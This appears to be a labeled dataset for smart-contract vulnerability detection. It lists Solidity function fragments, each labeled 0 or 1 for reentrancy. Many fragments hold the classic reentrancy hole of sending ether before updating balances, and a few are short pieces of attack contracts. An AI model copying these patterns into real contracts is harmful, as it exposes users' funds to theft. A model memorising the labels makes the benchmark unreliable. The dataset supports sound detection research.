1 Reentrance_01.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalance[msg.sender])())){ throw; }
userBalance[msg.sender] = 0;
1
---------------------------------
2 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
3 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
4 25808.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
5 Victim.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
1
---------------------------------
6 1751.sol
function proxy(address target, bytes data) public payable {
target.call.value(msg.value)(data);
contract VaultProxy is Proxy {
address public Owner;
mapping (address => uint256) public Deposits;
1
---------------------------------
7 14579.sol
function pay() public onlyOwner whenNotCanceled {
require(weiCollected > 0);
uint256 fee;
uint256 netAmount;
(fee, netAmount) = _getFeeAndNetAmount(weiCollected);
require(address(sale).call.value(netAmount)(this));
tokensReceived = getToken().balanceOf(this);
if (fee != 0) {
manager.transfer(fee);
paid = true;
emit Paid(netAmount, fee);
0
---------------------------------
8 18425.sol
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
0
---------------------------------
9 15458.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data )
require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public  returns (bool success)  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require(value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
if (isContract(rx)) {
rx.tokenFallback( msg.sender, value, data );
return true;
return false;
1
---------------------------------
10 27398.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
11 36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
12 27159.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
if (isContract(to)) {
ContractReceiver rx = ContractReceiver( to );
require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require(value <= allowances_[from][msg.sender]);
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data) public returns (bool success) {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private returns (bool success) {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback(msg.sender, value, data);
return true;
1
---------------------------------
13 33851.sol
function donate(bytes32 hash) payable {
print(hash);
if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw;
uint256 tokens = (msg.value * price());
balances[msg.sender] = (balances[msg.sender] + tokens);
totalSupply = (totalSupply + tokens);
saleEtherRaised = (saleEtherRaised + msg.value);
if (!founder.call.value(msg.value)()) throw;
Donate(msg.value, tokens);
0
---------------------------------
14 19128.sol
function doWithdraw(address from, address to, uint256 amount) internal {
require(amount <= MAX_WITHDRAWAL);
require(balances[from] >= amount);
require(withdrawalCount[from] < 3);
balances[from] = balances[from].sub(amount);
to.call.value(amount)();
withdrawalCount[from] = withdrawalCount[from].add(1);
function withdraw(uint256 amount) public {
doWithdraw(msg.sender, msg.sender, amount);
function withdrawTo(address to, uint256 amount) public {
doWithdraw(msg.sender, to, amount);
function withdrawFor(address from, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, msg.sender, amount);
function withdrawForTo(address from, address to, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, to, amount);
1
---------------------------------
15 35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation);
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
16 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
17 Reentrance_02.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
function() public payable {}
1
---------------------------------
18 23088.sol
function atomicize(address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{
require(addrs.length == values.length && addrs.length == calldataLengths.length);
uint j = 0;
for (uint i = 0; i < addrs.length; i++) {
bytes memory calldata = new bytes(calldataLengths[i]);
for (uint k = 0; k < calldataLengths[i]; k++) {
calldata[k] = calldatas[j];
j++;
require(addrs[i].call.value(values[i])(calldata));
1
---------------------------------
19 28687.sol
function CashOut(uint _am) {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
1
---------------------------------
20 1430.sol
function callContract(address to, bytes data) onlyOwner public payable returns (bool) {
require(to.call.value(msg.value)(data));
return true;
0
---------------------------------
21 36334.sol
function buy_the_tokens() {
require(msg.sender == owner);
require(!bought_tokens);
require(sale != 0x0);
require(this.balance >= min_required_amount);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
0
---------------------------------
22 39749.sol
function calcRefund(address _addressToRefund) internal {
uint amount = balanceOf[_addressToRefund];
balanceOf[_addressToRefund] = 0;
if (amount > 0) {
if (_addressToRefund.call.value(amount)()) {
LogFundTransfer(_addressToRefund, amount, false);
} else {
balanceOf[_addressToRefund] = amount;
function safeWithdraw() public onlyAfterDeadline {
if (amountRaised >= fundingGoal){
fundingGoalReached = true;
LogGoalReached(bankRollBeneficiary, amountRaised);
crowdsaleClosed = true;
if (!fundingGoalReached) {
calcRefund(msg.sender);
if (msg.sender == owner && fundingGoalReached) {
bankrollBeneficiaryAmount = (this.balance*80)/100;
if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) {
LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false);
etherollBeneficiaryAmount = this.balance;
if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw;
LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false);
} else {
fundingGoalReached = false;
function emergencyWithdraw() public isEmergency  {
calcRefund(msg.sender);
0
---------------------------------
23 26523.sol
function claim_reward(uint uid, bytes32 passcode) public payable{
require(msg.value >= parameters["price"]);
require(is_passcode_correct(uid, passcode));
uint final_reward = get_reward(uid) + msg.value;
if (final_reward > parameters["price_poοl"])
final_reward = parameters["price_poοl"];
require(msg.sender.call.value(final_reward)());
parameters["price_poοl"] -= final_reward;
if (uid + 1 < users.length)
users[uid] = users[users.length - 1];
users.length -= 1;
1
---------------------------------
24 2071.sol
function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = _p3d;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _com;
_com = 0;
uint256 _long = _eth / 100;
address(otherF3DInc).call.value(_long)(bytes4(keccak256("deposit()")));
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _com;
_com = 0;
uint256 _long = _eth / 100;
address(otherF3DInc).call.value(_long)(bytes4(keccak256("deposit()")));
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
0
---------------------------------
25 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
26 37836.sol
function collect() onlyOwner {
require(addrcnt.call.value(this.balance)(0));
Collect(addrcnt,this.balance);
0
---------------------------------
27 36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
28 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
29 Reentrance_03.sol
function withdrawBalance_fixed() {
uint amount = userBalance[msg.sender];
userBalance[msg.sender] = 0;
if(!(msg.sender.call.value(amount)())){ throw; }
0
---------------------------------
30 39994.sol
function safeSend(address _recipient, uint _ether) internal preventReentry() returns (bool success_) {
if(!_recipient.call.value(_ether)()) throw;
success_ = true;
pragma solidity ^0.4.0;
contract Math
string constant VERSION = "Math 0.0.1 \n";
uint constant NULL = 0;
bool constant LT = false;
bool constant GT = true;
uint constant iTRUE = 1;
uint constant iFALSE = 0;
uint constant iPOS = 1;
uint constant iZERO = 0;
uint constant iNEG = uint(-1);
function withdraw(uint _ether) external canEnter hasEther(msg.sender, _ether) returns (bool success_) {
etherBalance[msg.sender] -= _ether;
safeSend(msg.sender, _ether);
success_ = true;
0
---------------------------------
31 38888.sol
function withdraw() onlyOwner {
if (!owner.call.value(this.balance)()) throw;
0
---------------------------------
32 38724.sol
function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
return allowed[_owner][_spender];
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
contract ERC20nator is StandardToken, Ownable {
address public fundraiserAddress;
bytes public fundraiserCallData;
uint constant issueFeePercent = 2;
event requestedRedeem(address indexed requestor, uint amount);
event redeemed(address redeemer, uint amount);
function() payable {
uint issuedTokens = msg.value * (100 - issueFeePercent) / 100;
if(!owner.send(msg.value - issuedTokens)) throw;
if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw;
totalSupply += issuedTokens;
balances[msg.sender] += issuedTokens;
1
---------------------------------
33 29601.sol
function transferInternal(address from, address to, uint256 value, bytes data, bool useCustomFallback, string customFallback) internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(uint256 _time, address _from,address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback) internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
34 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
35 10297.sol
function execute0(address to, uint256 value, bytes data) private returns (address created)  {
if (to == 0) {
created = create0(value, data);
} else {
require(to.call.value(value)(data));
0
---------------------------------
36 13952.sol
function removeBankroll(uint _amount, string _callbackFn) public returns (uint _recalled)
address _bankroller = msg.sender;
uint _collateral = getCollateral();
uint _balance = address(this).balance;
uint _available = _balance > _collateral ? _balance - _collateral : 0;
if (_amount > _available) _amount = _available;
_amount = ledger.subtract(_bankroller, _amount);
bankroll = ledger.total();
if (_amount == 0) return;
bytes4 _sig = bytes4(keccak256(_callbackFn));
require(_bankroller.call.value(_amount)(_sig));
emit BankrollRemoved(now, _bankroller, _amount, bankroll);
return _amount;
function sendProfits() public returns (uint _profits)
int _p = profits();
if (_p <= 0) return;
_profits = uint(_p);
profitsSent += _profits;
address _tr = getTreasury();
require(_tr.call.value(_profits)());
emit ProfitsSent(now, _tr, _profits);
function _betFailure(string _msg, uint _bet, bool _doRefund) private
if (_doRefund) require(msg.sender.call.value(_bet)());
emit BetFailure(now, msg.sender, _bet, _msg);
function _uncreditUser(address _user, uint _amt) private
if (_amt > credits[_user] || _amt == 0) _amt = credits[_user];
if (_amt == 0) return;
vars.totalCredits -= uint88(_amt);
credits[_user] -= _amt;
require(_user.call.value(_amt)());
emit CreditsCashedout(now, _user, _amt);
1
---------------------------------
37 27188.sol
function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected {
if(!target.call.value(amount)()) throw;
Transfer(amount, message, target, currentOwner);
function divest(uint amount) public {
if (investors[msg.sender].investment == 0 || amount == 0) throw;
investors[msg.sender].investment -= amount;
sumInvested -= amount;
this.loggedTransfer(amount, "", msg.sender, owner);
function payDividend() public {
uint dividend = calculateDividend();
if (dividend == 0) throw;
investors[msg.sender].lastDividend = sumDividend;
this.loggedTransfer(dividend, "Dividend payment", msg.sender, owner);
function doTransfer(address target, uint amount) public onlyOwner {
this.loggedTransfer(amount, "Owner transfer", target, owner);
1
---------------------------------
38 38651.sol
function cancelBuyOrder(address token, uint price) {
bytes32 h = sha256(token, price, msg.sender);
uint remain = buyOrders[h];
delete buyOrders[h];
if (!msg.sender.call.value(remain)()) throw;
CancelBuyOrder(h,token,price,msg.sender);
0
---------------------------------
39 14620.sol
function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public {
require(walletToTransfer != address(0));
require(address(this).balance >= weiAmount);
require(address(this) != walletToTransfer);
require(walletToTransfer.call.value(weiAmount)());
0
---------------------------------
40 74.sol
function upgradeToAndCall(uint256 version, address implementation, bytes data) payable public onlyProxyOwner {
upgradeTo(version, implementation);
require(address(this).call.value(msg.value)(data));
contract EternalStorageProxy is OwnedUpgradeabilityProxy, EternalStorage {}
0
---------------------------------
41 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
42 773.sol
function sellDai(uint256 _drawInAttodai, uint256 _lockedInCdpInAttoeth, uint256 _feeInAttoeth) private {
uint256 _wethBoughtInAttoweth = matchingMarket.sellAllAmount(dai, _drawInAttodai, weth, 0);
uint256 _refundDue = msg.value.add(_wethBoughtInAttoweth).sub(_lockedInCdpInAttoeth).sub(_feeInAttoeth);
if (_refundDue > 0) {
weth.withdraw(_refundDue);
require(msg.sender.call.value(_refundDue)());
function closeGiftedCdp(bytes32 _cdpId, uint256 _minimumValueInAttoeth, address _recipient) external wethBalanceIncreased returns (uint256 _payoutOwnerInAttoeth) {
require(_recipient != address(0));
uint256 _lockedPethInAttopeth = maker.ink(_cdpId);
uint256 _debtInAttodai = maker.tab(_cdpId);
uint256 _lockedWethInAttoweth = _lockedPethInAttopeth.div27(maker.per());
uint256 _wethSoldInAttoweth = matchingMarket.buyAllAmount(dai, _debtInAttodai, weth, _lockedWethInAttoweth);
uint256 _providerFeeInAttoeth = _wethSoldInAttoweth.mul18(providerFeePerEth);
uint256 _mkrBalanceBeforeInAttomkr = mkr.balanceOf(this);
maker.wipe(_cdpId, _debtInAttodai);
uint256 _mkrBurnedInAttomkr = _mkrBalanceBeforeInAttomkr.sub(mkr.balanceOf(this));
uint256 _ethValueOfBurnedMkrInAttoeth = _mkrBurnedInAttomkr.mul(uint256(maker.pep().read())).div(uint256(maker.pip().read()));
_payoutOwnerInAttoeth = _lockedWethInAttoweth.sub(_wethSoldInAttoweth).sub(_providerFeeInAttoeth).sub(_ethValueOfBurnedMkrInAttoeth);
require(_payoutOwnerInAttoeth >= _minimumValueInAttoeth);
maker.free(_cdpId, _lockedPethInAttopeth);
maker.exit(_lockedPethInAttopeth);
maker.give(_cdpId, msg.sender);
weth.withdraw(_payoutOwnerInAttoeth);
require(_recipient.call.value(_payoutOwnerInAttoeth)());
emit CloseCup(msg.sender, uint256(_cdpId));
0
---------------------------------
43 30178.sol
function buy() payable notPaused() public returns(bool) {
require(now >= salesStart);
require(now < salesDeadline);
uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE;
require(tokensToBuy > 0);
uint timeBonus = _calculateTimeBonus(tokensToBuy, now);
uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value);
uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus;
require(token.transfer(msg.sender, totalTokensToTransfer));
LogBought(msg.sender, msg.value, totalTokensToTransfer, 0);
require(wallet.call.value(msg.value)());
return true;
0
---------------------------------
44 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
45 18145.sol
function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner {
___upgradeTo(newTarget);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
46 21277.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
modifier onlyManager
require(msg.sender == manager);
contract EthernameRaw is Managed {
event Transfer(address indexed from, address indexed to, bytes32 indexed name);
event Approval(address indexed owner, address indexed approved, bytes32 indexed name);
event SendEther(address indexed from, address indexed to, bytes32 sender, bytes32 recipient, uint256 value);
event Name(address indexed owner, bytes32 indexed name);
event Price(bytes32 indexed name, uint256 price);
event Buy(bytes32 indexed name, address buyer, uint256 price);
event Attribute(bytes32 indexed name, bytes32 key);
struct Record {
address owner;
uint256 price;
mapping (bytes32 => bytes) attrs;
string public constant name = "Ethername";
string public constant symbol = "ENM";
mapping (address => bytes32) public ownerToName;
mapping (bytes32 => Record) public nameToRecord;
mapping (bytes32 => address) public nameToApproved;
0
---------------------------------
47 14353.sol
function buy(){
require(sale != 0x0);
require(sale.call.value(this.balance)());
1
---------------------------------
48 Reentrance_exploit.sol
function deposit(address _vulnerable_contract) public payable {
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
49 22805.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
50 4598.sol
function futrMiner() public payable {
require(futr.call.value(msg.value)());
uint256 mined = ERC20(futr).balanceOf(address(this));
ERC20(futr).approve(mny, mined);
MNY(mny).mine(futr, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
function futxMiner() public payable {
require(futx.call.value(msg.value)());
uint256 mined = ERC20(futx).balanceOf(address(this));
ERC20(futx).approve(mny, mined);
MNY(mny).mine(futx, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
0
---------------------------------
51 Bank_attack.sol
function step1(uint256 amount) payable {
if (this.balance >= amount) {
